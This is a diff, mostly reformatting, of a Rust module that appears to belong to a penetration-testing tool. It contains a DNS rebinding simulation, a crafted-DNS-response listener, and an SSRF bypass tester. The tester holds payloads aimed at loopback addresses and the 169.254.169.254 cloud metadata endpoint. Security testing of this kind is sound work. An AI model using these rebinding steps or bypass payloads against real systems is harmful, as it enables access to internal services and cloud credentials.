@@ -21,9 +21,20 @@ pub async fn attack(
     let attacker_ip = "127.0.0.1";
     let internal_ip = "169.254.169.254";
 
-    println!("{} Phase 1: DNS resolves to attacker IP ({})", "[*]".cyan().bold(), attacker_ip);
-    println!("{} Phase 2: DNS resolves to internal IP ({})", "[*]".cyan().bold(), internal_ip);
-    println!("{} The target will cache the first resolution, then use the second for the actual request.", "[*]".cyan().bold());
+    println!(
+        "{} Phase 1: DNS resolves to attacker IP ({})",
+        "[*]".cyan().bold(),
+        attacker_ip
+    );
+    println!(
+        "{} Phase 2: DNS resolves to internal IP ({})",
+        "[*]".cyan().bold(),
+        internal_ip
+    );
+    println!(
+        "{} The target will cache the first resolution, then use the second for the actual request.",
+        "[*]".cyan().bold()
+    );
     println!();
 
     let mut results = Vec::new();
@@ -32,7 +43,14 @@ pub async fn attack(
         let phase = if i % 2 == 0 { "attacker" } else { "internal" };
         let ip = if i % 2 == 0 { attacker_ip } else { internal_ip };
 
-        println!("  {} Request {}/{} — phase={} ip={}", "*".cyan(), i + 1, count, phase, ip);
+        println!(
+            "  {} Request {}/{} — phase={} ip={}",
+            "*".cyan(),
+            i + 1,
+            count,
+            phase,
+            ip
+        );
 
         if i > 0 && interval > 0 {
             tokio::time::sleep(Duration::from_secs(interval)).await;
@@ -42,22 +60,31 @@ pub async fn attack(
     }
 
     println!("\n{} Attack Summary:", "[*]".cyan().bold());
-    for (req, phase, ip) in &results {
-        let tag = if phase == "internal" { "INTERNAL".red().to_string() } else { "attacker".green().to_string() };
+    for (req, phase, _ip) in &results {
+        let tag = if phase == "internal" {
+            "INTERNAL".red().to_string()
+        } else {
+            "attacker".green().to_string()
+        };
         println!("  {} Request {} — {} ({})", "*".cyan(), req, phase, tag);
     }
 
-    println!("\n{} DNS rebinding attack simulation complete.", "[*]".cyan().bold());
-    println!("{} In a real attack, configure your DNS server to alternate A records.", "[*]".cyan().bold());
-    println!("{} Example: target.com A 127.0.0.1 (TTL=0) / target.com A 169.254.169.254 (TTL=0)", "[*]".cyan().bold());
+    println!(
+        "\n{} DNS rebinding attack simulation complete.",
+        "[*]".cyan().bold()
+    );
+    println!(
+        "{} In a real attack, configure your DNS server to alternate A records.",
+        "[*]".cyan().bold()
+    );
+    println!(
+        "{} Example: target.com A 127.0.0.1 (TTL=0) / target.com A 169.254.169.254 (TTL=0)",
+        "[*]".cyan().bold()
+    );
     Ok(())
 }
 
-pub async fn listen(
-    port: u16,
-    _token: Option<&str>,
-    _timeout: u64,
-) -> anyhow::Result<()> {
+pub async fn listen(port: u16, _token: Option<&str>, _timeout: u64) -> anyhow::Result<()> {
     println!("{} DNS Rebinding Listener", "[*]".cyan().bold());
     println!("{}", "=".repeat(60).cyan());
     println!("{} Port: {}", "[*]".cyan().bold(), port);
@@ -78,7 +105,9 @@ pub async fn listen(
                 let data = &buf[..len];
                 let query_id = if len >= 2 {
                     u16::from_be_bytes([data[0], data[1]])
-                } else { 0 };
+                } else {
+                    0
+                };
 
                 let hit = format!("Query ID={} from {} ({} bytes)", query_id, addr, len);
                 println!("{} {}", "[+]".green().bold(), hit);
@@ -92,13 +121,12 @@ pub async fn listen(
                     response[7] = 0x01;
 
                     let mut answer = vec![
-                        0xc0, 0x0c,
-                        0x00, 0x01,
-                        0x00, 0x01,
-                        0x00, 0x00, 0x00, 0x00,
-                        0x00, 0x04,
+                        0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04,
                     ];
-                    let ip_parts: Vec<u8> = response_ip.split('.').map(|p| p.parse().unwrap_or(127)).collect();
+                    let ip_parts: Vec<u8> = response_ip
+                        .split('.')
+                        .map(|p| p.parse().unwrap_or(127))
+                        .collect();
                     answer.extend_from_slice(&ip_parts);
                     response.extend(answer);
                 }
@@ -113,11 +141,7 @@ pub async fn listen(
     }
 }
 
-pub async fn bypass(
-    target: &str,
-    _token: Option<&str>,
-    timeout: u64,
-) -> anyhow::Result<()> {
+pub async fn bypass(target: &str, _token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
     println!("{} DNS Rebinding Bypass Test", "[*]".cyan().bold());
     println!("{}", "=".repeat(60).cyan());
     println!("{} Target: {}", "[*]".cyan().bold(), target);
@@ -130,7 +154,10 @@ pub async fn bypass(
 
     let bypass_payloads = [
         ("Direct IP", "http://127.0.0.1/"),
-        ("Direct IP with host", "http://127.0.0.1/ -H 'Host: target.com'"),
+        (
+            "Direct IP with host",
+            "http://127.0.0.1/ -H 'Host: target.com'",
+        ),
         ("localhost", "http://localhost/"),
         ("0.0.0.0", "http://0.0.0.0/"),
         ("[::1]", "http://[::1]/"),
@@ -139,7 +166,10 @@ pub async fn bypass(
         ("Decimal IP", "http://2130706433/"),
         ("Hex IP", "http://0x7f000001/"),
         ("Octal IP", "http://017700000001/"),
-        ("Metadata via 169.254", "http://169.254.169.254/latest/meta-data/"),
+        (
+            "Metadata via 169.254",
+            "http://169.254.169.254/latest/meta-data/",
+        ),
         ("Metadata via 0.0.0.0", "http://0.0.0.0/latest/meta-data/"),
     ];
 
@@ -156,18 +186,34 @@ pub async fn bypass(
             Ok(resp) => {
                 let status = resp.status().as_u16();
                 let body = resp.text().await.unwrap_or_default();
-                let interesting = status == 200 && (
-                    body.contains("metadata") || body.contains("ami-") ||
-                    body.contains("instance-id") || body.contains("root") ||
-                    body.contains("admin") || body.contains("dashboard")
+                let interesting = status == 200
+                    && (body.contains("metadata")
+                        || body.contains("ami-")
+                        || body.contains("instance-id")
+                        || body.contains("root")
+                        || body.contains("admin")
+                        || body.contains("dashboard"));
+                let status_str = if interesting {
+                    "BYPASSED".red().bold().to_string()
+                } else if status == 200 {
+                    "ok".to_string()
+                } else {
+                    format!("status {}", status)
+                };
+                println!(
+                    "  {} {:30} status={} {}",
+                    "*".cyan(),
+                    name,
+                    status,
+                    status_str
                 );
-                let status_str = if interesting { "BYPASSED".red().bold().to_string() }
-                    else if status == 200 { "ok".to_string() }
-                    else { format!("status {}", status) };
-                println!("  {} {:30} status={} {}", "*".cyan(), name, status, status_str);
 
                 if interesting {
-                    println!("    {} Response: {}", ">".red().bold(), body.chars().take(200).collect::<String>());
+                    println!(
+                        "    {} Response: {}",
+                        ">".red().bold(),
+                        body.chars().take(200).collect::<String>()
+                    );
                     bypassed.push(name.to_string());
                 }
             }
@@ -180,7 +226,11 @@ pub async fn bypass(
     if bypassed.is_empty() {
         println!("\n{} No bypass succeeded.", "[-]".yellow().bold());
     } else {
-        println!("\n{} {} bypass(es) succeeded:", "[*]".cyan().bold(), bypassed.len());
+        println!(
+            "\n{} {} bypass(es) succeeded:",
+            "[*]".cyan().bold(),
+            bypassed.len()
+        );
         for name in &bypassed {
             println!("  {} {}", "*".red(), name);
         }
